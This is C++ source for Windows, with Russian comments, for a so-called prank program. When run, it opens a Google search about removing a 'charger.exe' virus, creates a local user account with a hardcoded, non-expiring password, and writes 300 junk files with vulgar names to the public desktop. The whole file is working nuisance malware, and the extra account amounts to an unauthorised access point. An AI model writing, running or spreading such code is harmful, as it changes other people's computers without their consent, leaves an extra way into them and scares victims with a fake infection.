#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <lm.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <random>
#include <cstdio>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")

// ---------- 1. Гугл с запросом ----------
static void OpenGoogleSearch(const std::wstring& query) {
    std::wstring url = L"https://www.google.com/search?q=";
    for (wchar_t c : query) {
        if (c == L' ') url += L'+';
        else url += c;
    }
    ShellExecuteW(nullptr, L"open", url.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
}

// ---------- 2. Создание локального пользователя ----------
static bool CreateLocalUser(const std::wstring& name, const std::wstring& password) {
    USER_INFO_1 ui{};
    ui.usri1_name        = const_cast<LPWSTR>(name.c_str());
    ui.usri1_password    = const_cast<LPWSTR>(password.c_str());
    ui.usri1_priv        = USER_PRIV_USER;
    ui.usri1_home_dir    = nullptr;
    ui.usri1_comment     = const_cast<LPWSTR>(L"created by prank");
    ui.usri1_flags       = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = nullptr;

    DWORD err = 0;
    NET_API_STATUS st = NetUserAdd(nullptr, 1, reinterpret_cast<LPBYTE>(&ui), &err);
    return st == NERR_Success || st == NERR_UserExists;
}

// ---------- 3. Генерация мусорных файлов ----------
static std::wstring GetPublicDesktop() {
    PWSTR path = nullptr;
    std::wstring res;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_PublicDesktop, 0, nullptr, &path))) {
        res = path;
        CoTaskMemFree(path);
    }
    return res;
}

static void DropGandonFiles(const std::wstring& dir, int count) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> suffixLen(1, 12);
    const wchar_t alphabet[] = L"werdgando";

    for (int i = 0; i < count; ++i) {
        std::wstring name;
        int n = suffixLen(gen);
        for (int j = 0; j < n; ++j) {
            name += alphabet[gen() % (sizeof(alphabet)/sizeof(wchar_t) - 1)];
        }
        std::wstring full = dir + L"\\" + name + L".gandon";

        HANDLE h = CreateFileW(full.c_str(), GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            const char payload[] = "werereeere\r\n";
            DWORD written = 0;
            WriteFile(h, payload, sizeof(payload) - 1, &written, nullptr);
            CloseHandle(h);
        }
    }
}

// ---------- entry ----------
int wmain() {
    OpenGoogleSearch(L"как избавиться от вируса charger.exe");

    const std::wstring user = L"werereeere";
    const std::wstring pass = L"gandon123";
    CreateLocalUser(user, pass);

    std::wstring desk = GetPublicDesktop();
    if (!desk.empty()) {
        DropGandonFiles(desk, 300);
    }

    return 0;
}
